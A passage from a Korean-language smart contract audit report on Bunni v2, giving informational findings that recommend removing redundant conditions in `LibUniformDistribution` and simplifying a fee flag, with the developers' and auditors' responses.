        uint24 swapFee;
        uint256 swapFeeAmount;
--      useAmAmmFee = hookParams.amAmmEnabled && amAmmManager != address(0);
++      useAmAmmFee = amAmmManager != address(0);
```

**Bacon Labs:** 인지됨(Acknowledged). 제안된 대로 `useAmAmmFee`를 단순화하려고 시도했을 때 스왑의 가스 비용이 실제로 약 50 가스 증가했습니다. 이유(아마도 solc 최적화의 이상함)는 모르겠지만 그대로 두겠습니다.

**Cyfrin:** 인지됨(Acknowledged).


### Unnecessary conditions can be removed from `LibUniformDistribution` conditionals

**Description:** `LibUniformDistribution::inverseCumulativeAmount0`은 지정된 `cumulativeAmount0_`이 0인 경우 단락(short circuit)되므로, 이 변수의 값은 수정되지 않으므로 후속 실행에서 0이 아닌 것으로 보장됩니다:

```solidity
function inverseCumulativeAmount0(
    uint256 cumulativeAmount0_,
    uint256 totalLiquidity,
    int24 tickSpacing,
    int24 tickLower,
    int24 tickUpper,
    bool isCarpet
) internal pure returns (bool success, int24 roundedTick) {
    // short circuit if cumulativeAmount0_ is 0
    if (cumulativeAmount0_ == 0) return (true, tickUpper);

    ...

    // ensure that roundedTick is not tickUpper when cumulativeAmount0_ is non-zero
    // this can happen if the corresponding cumulative density is too small
    if (roundedTick == tickUpper && cumulativeAmount0_ != 0) {
        return (true, tickUpper - tickSpacing);
    }
}
```

따라서 최종 `if` 문의 두 번째 조건은 단락에 의해 처리되므로 제거할 수 있습니다. `LibUniformDistribution::inverseCumulativeAmount1`에도 유사한 경우가 존재합니다.

**Recommended Mitigation:** * `LibUniformDistribution::inverseCumulativeAmount0`:

```diff
    function inverseCumulativeAmount0(
        uint256 cumulativeAmount0_,
        uint256 totalLiquidity,
        int24 tickSpacing,
        int24 tickLower,
        int24 tickUpper,
        bool isCarpet
    ) internal pure returns (bool success, int24 roundedTick) {
        // short circuit if cumulativeAmount0_ is 0
        if (cumulativeAmount0_ == 0) return (true, tickUpper);

        ...

        // ensure that roundedTick is not tickUpper when cumulativeAmount0_ is non-zero
        // this can happen if the corresponding cumulative density is too small
--      if (roundedTick == tickUpper && cumulativeAmount0_ != 0) {
++      if (roundedTick == tickUpper) {
            return (true, tickUpper - tickSpacing);
        }
    }
```

* `LibUniformDistribution::inverseCumulativeAmount1`:

```diff
    function inverseCumulativeAmount1(
        uint256 cumulativeAmount1_,
        uint256 totalLiquidity,
        int24 tickSpacing,
        int24 tickLower,
        int24 tickUpper,
        bool isCarpet
    ) internal pure returns (bool success, int24 roundedTick) {
        // short circuit if cumulativeAmount1_ is 0
        if (cumulativeAmount1_ == 0) return (true, tickLower - tickSpacing);

        ...

        // ensure that roundedTick is not (tickLower - tickSpacing) when cumulativeAmount1_ is non-zero and rounding up
        // this can happen if the corresponding cumulative density is too small
--      if (roundedTick == tickLower - tickSpacing && cumulativeAmount1_ != 0) {
++      if (roundedTick == tickLower - tickSpacing) {
            return (true, tickLower);
        }
    }
```

**Bacon Labs:** [PR \#117](https://github.com/timeless-fi/bunni-v2/pull/117)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 카펫형(carpeted) LDF에서 단락 로직이 개선되었으며 `LibUniformDistribution` 및 `LibGeometricDistribution`에서 불필요한 검증이 제거되었습니다.

\clearpage
